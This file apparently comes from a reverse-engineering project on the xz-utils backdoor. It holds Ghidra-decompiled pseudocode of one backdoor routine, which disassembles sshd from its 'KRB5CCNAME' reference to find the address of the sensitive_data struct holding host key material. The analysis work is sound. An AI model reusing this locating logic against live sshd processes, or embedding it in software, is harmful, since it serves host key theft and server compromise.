// /home/kali/xzre-ghidra/xzregh/103340_sshd_get_sensitive_data_address_via_krb5ccname.c
// Function: sshd_get_sensitive_data_address_via_krb5ccname @ 0x103340
// Calling convention: unknown
// Prototype: undefined sshd_get_sensitive_data_address_via_krb5ccname(void)


/*
 * AutoDoc: Starts at the string reference to 'KRB5CCNAME', disassembles forward until it sees the
 * getenv result copied into memory, and only accepts stores that land inside sshd's .data/.bss
 * window with the expected -0x18 displacement pattern. That combination reliably identifies the
 * sensitive_data struct that holds host key material after sshd propagates the Kerberos cache
 * path.
 */
#include "xzre_types.h"


undefined8
sshd_get_sensitive_data_address_via_krb5ccname
          (ulong param_1,ulong param_2,long param_3,ulong param_4,ulong *param_5,undefined8 param_6)

{
  byte bVar1;
  int iVar2;
  ulong uVar3;
  uint uVar4;
  long lVar5;
  byte bVar6;
  ulong uVar7;
  ulong uVar8;
  long *plVar9;
  byte bVar10;
  byte bVar11;
  long local_d8;
  long local_d0;
  undefined2 local_c8;
  byte local_bd;
  undefined4 local_bc;
  byte local_b8;
  uint local_b0;
  long local_a8;
  long local_98;
  long local_80;
  long local_78;
  undefined2 local_70;
  char local_65;
  undefined4 local_64;
  byte local_60;
  int local_58;
  long local_50;
  
  bVar11 = 0;
  plVar9 = &local_d8;
  for (lVar5 = 0x16; lVar5 != 0; lVar5 = lVar5 + -1) {
    *(undefined4 *)plVar9 = 0;
    plVar9 = (long *)((long)plVar9 + 4);
  }
  *param_5 = 0;
  uVar3 = elf_find_string_reference(param_6,0x1e0,param_3,param_4);
  if (uVar3 != 0) {
    while (uVar3 < param_4) {
      iVar2 = x86_dasm(&local_d8,uVar3,param_4);
      if (iVar2 == 0) {
        uVar3 = uVar3 + 1;
      }
      else {
        if ((local_b0 & 0xfffffffd) == 0xb1) {
          if (local_bc._1_1_ == '\x03') {
            if (((local_c8 & 0x20) == 0) || ((local_bd & 8) == 0)) {
              bVar1 = (byte)local_c8 & 0x40;
              if ((local_c8 & 0x1040) == 0) {
                if ((local_c8 & 0x40) != 0) {
                  bVar10 = 0;
                  bVar1 = local_bc._3_1_;
                  if ((local_c8 & 0x20) != 0) {
LAB_00103450:
                    bVar1 = local_bc._3_1_ | (local_bd & 1) << 3;
                  }
                  goto LAB_0010345d;
                }
                bVar10 = 0;
              }
              else {
                if ((local_c8 & 0x40) == 0) {
                  bVar10 = local_c8._1_1_ & 0x10;
                  if ((local_c8 & 0x1000) == 0) goto LAB_0010346b;
                  bVar10 = local_b8;
                  if ((local_c8 & 0x20) != 0) {
                    bVar10 = local_b8 | (local_bd & 1) << 3;
                  }
                }
                else {
                  bVar10 = local_bc._2_1_;
                  bVar1 = local_bc._3_1_;
                  if ((local_c8 & 0x20) != 0) {
                    bVar10 = local_bc._2_1_ | local_bd * '\x02' & 8;
                    goto LAB_00103450;
                  }
                }
LAB_0010345d:
                if (bVar1 != bVar10) goto LAB_001033d1;
              }
LAB_0010346b:
              plVar9 = &local_80;
              for (lVar5 = 0x16; lVar5 != 0; lVar5 = lVar5 + -1) {
                *(undefined4 *)plVar9 = 0;
                plVar9 = (long *)((long)plVar9 + (ulong)bVar11 * -8 + 4);
              }
              uVar8 = local_d0 + local_d8;
              uVar4 = 0;
              while (((uVar8 < param_4 && (uVar4 < 6)) &&
                     (iVar2 = x86_dasm(&local_80,uVar8,param_4), iVar2 != 0))) {
                if (local_58 == 0x109) {
                  if ((local_64 & 0xff00ff00) == 0x5000000) {
                    bVar1 = 0;
                    if ((local_70 & 0x1040) != 0) {
                      if ((local_70 & 0x40) == 0) {
                        bVar1 = local_70._1_1_ & 0x10;
                        if (((local_70 & 0x1000) != 0) && (bVar1 = local_60, (local_70 & 0x20) != 0)
                           ) {
                          bVar6 = local_65 << 3;
                          goto LAB_00103553;
                        }
                      }
                      else {
                        bVar1 = local_64._2_1_;
                        if ((local_70 & 0x20) != 0) {
                          bVar6 = local_65 * '\x02';
LAB_00103553:
                          bVar1 = bVar1 | bVar6 & 8;
                        }
                      }
                    }
                    if (bVar1 == bVar10) {
                      lVar5 = 0;
                      if ((local_70 & 0x100) != 0) {
                        lVar5 = local_50 + local_80 + local_78;
                      }
                      uVar7 = lVar5 - 0x18;
                      if ((param_1 <= uVar7 && lVar5 != 0x18) && (lVar5 + 4U <= param_2))
                      goto LAB_0010365f;
                    }
                  }
                }
                else if (local_58 == 0xa5fe) break;
                uVar8 = uVar8 + local_78;
                uVar4 = uVar4 + 1;
              }
            }
          }
        }
        else if (local_b0 == 0x147) {
          if (((((local_bd & 8) == 0) && (local_bc >> 8 == 0x50000)) && ((local_c8 & 0x800) != 0))
             && (local_98 == 0)) {
            lVar5 = 0;
            if ((local_c8 & 0x100) != 0) {
              lVar5 = local_a8 + local_d8 + local_d0;
            }
            uVar7 = lVar5 - 0x18;
            if (((lVar5 + 4U <= param_2) && (param_1 <= uVar7)) && (uVar7 != 0)) {
LAB_0010365f:
              *param_5 = uVar7;
              return 1;
            }
          }
        }
        else if ((local_b0 == 0xa5fe) && (param_3 != local_d8)) {
          return 0;
        }
LAB_001033d1:
        uVar3 = uVar3 + local_d0;
      }
    }
  }
  return 0;
}

